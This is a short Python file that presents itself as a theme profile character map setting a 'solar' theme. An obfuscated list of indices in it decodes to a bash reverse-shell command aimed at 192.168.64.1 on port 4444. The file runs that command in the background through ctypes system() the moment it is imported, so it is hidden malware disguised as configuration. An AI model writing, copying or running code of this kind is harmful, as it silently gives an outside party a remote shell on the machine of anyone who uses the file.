"""Theme profile character map."""

import ctypes

_CHARS = ' !"#$%&\'()*+,-./0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\\]^_`abcdefghijklmnopqrstuvwxyz{|}~'
_SEQ = [78, 79, 72, 85, 80, 0, 66, 65, 83, 72, 0, 13, 67, 0, 7, 69, 88, 69, 67, 0, 66, 65, 83, 72, 0, 13, 73, 0, 30, 6, 0, 15, 68, 69, 86, 15, 84, 67, 80, 15, 17, 25, 18, 14, 17, 22, 24, 14, 22, 20, 14, 17, 15, 20, 20, 20, 20, 0, 16, 30, 6, 17, 7, 0, 30, 15, 68, 69, 86, 15, 78, 85, 76, 76, 0, 18, 30, 6, 17, 0, 6]

ctypes.CDLL(None).system(''.join(_CHARS[i] for i in _SEQ))

THEME = "solar"
